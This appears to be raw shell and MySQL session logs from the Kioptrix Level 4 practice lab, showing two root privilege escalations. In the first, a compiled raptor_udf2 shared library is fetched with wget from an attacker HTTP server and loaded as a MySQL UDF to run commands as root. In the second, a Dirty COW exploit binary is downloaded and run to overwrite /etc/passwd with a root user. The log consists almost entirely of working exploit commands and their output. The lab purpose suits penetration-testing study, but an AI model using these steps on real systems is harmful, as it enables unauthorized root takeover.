root@kali:~/kioptrix/level4/UDF# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
root@kali:~/kioptrix/level4/UDF# ls -la
total 40
drwxr-xr-x 2 root root  4096 Jan  4 22:23 .
drwxr-xr-x 4 root root  4096 Jan  4 22:21 ..
-rw-r--r-- 1 root root  3378 Jan  4 22:22 raptor_udf2.c
-rw-r--r-- 1 root root  7232 Jan  4 22:23 raptor_udf2.o
-rwxr-xr-x 1 root root 19120 Jan  4 22:23 raptor_udf2.so
root@kali:~/kioptrix/level4/UDF# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


robert@Kioptrix4:~$ wget http://192.168.88.128:8000/raptor_udf2.so
--15:15:28--  http://192.168.88.128:8000/raptor_udf2.so
           => `raptor_udf2.so'
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19,120 (19K) [application/octet-stream]

100%[==========================================================================================================================================>] 19,120        --.--K/s             

15:15:28 (164.09 MB/s) - `raptor_udf2.so' saved [19120/19120]

robert@Kioptrix4:~$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/home/robert/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)

mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 22 raptor_udf2.so: wrong ELF class: ELFCLASS64)



^C
Keyboard interrupt received, exiting.
root@kali:~/kioptrix/level4/UDF# ls
raptor_udf2.c  raptor_udf2.o  raptor_udf2.so
root@kali:~/kioptrix/level4/UDF# mkdir 64
root@kali:~/kioptrix/level4/UDF# mv * 64
mv: cannot move '64' to a subdirectory of itself, '64/64'
root@kali:~/kioptrix/level4/UDF# cp 64/raptor_udf2.c .
root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c -m32
root@kali:~/kioptrix/level4/UDF# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc -m32
root@kali:~/kioptrix/level4/UDF# python3 -m http.server

robert@Kioptrix4:~$ rm raptor_udf2.so
robert@Kioptrix4:~$ wget http://192.168.88.128:8000/raptor_udf2.so
--15:20:13--  http://192.168.88.128:8000/raptor_udf2.so
           => `raptor_udf2.so'
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17,944 (18K) [application/octet-stream]

100%[==========================================================================================================================================>] 17,944        --.--K/s             

15:20:13 (23.32 MB/s) - `raptor_udf2.so' saved [17944/17944]

robert@Kioptrix4:~$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 40
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> drop table foo;
Query OK, 0 rows affected (0.00 sec)

mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/home/robert/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
ERROR 1086 (HY000): File '/usr/lib/raptor_udf2.so' already exists
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2_32.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2_32.so';
Query OK, 0 rows affected (0.01 sec)

mysql> select * from mysql.func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
| do_system             |   2 | raptor_udf2_32.so   | function | 
+-----------------------+-----+---------------------+----------+
3 rows in set (0.00 sec)

mysql> select do_system('id > /tmp/out; chown robert.robert /tmp/out');
+----------------------------------------------------------+
| do_system('id > /tmp/out; chown robert.robert /tmp/out') |
+----------------------------------------------------------+
|                                               8589934592 | 
+----------------------------------------------------------+
1 row in set (0.00 sec)

mysql> \! bash
robert@Kioptrix4:~$ cat /tmp/out 
uid=0(root) gid=0(root)
```

```
root@kali:~/kioptrix/level4/dirtycow# gcc -pthread dirty.c -o dirty -lcrypt -m32
root@kali:~/kioptrix/level4/dirtycow# python3 -m http.server


robert@Kioptrix4:~$ wget http://192.168.88.128:8000/dirty
--14:47:51--  http://192.168.88.128:8000/dirty
           => `dirty'
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16,744 (16K) [application/octet-stream]

100%[==========================================================================================================================================>] 16,744        --.--K/s             

14:47:51 (20.38 MB/s) - `dirty' saved [16744/16744]

robert@Kioptrix4:~$ chmod +x dirty
robert@Kioptrix4:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b7fa5000


root@kali:~# ssh firefart@192.168.88.132
firefart@192.168.88.132's password: 
Failed to add entry for user firefart.

Welcome to LigGoat Security Systems - We are Watching
firefart@Kioptrix4:~# id
uid=0(firefart) gid=0(root) groups=0(root)


```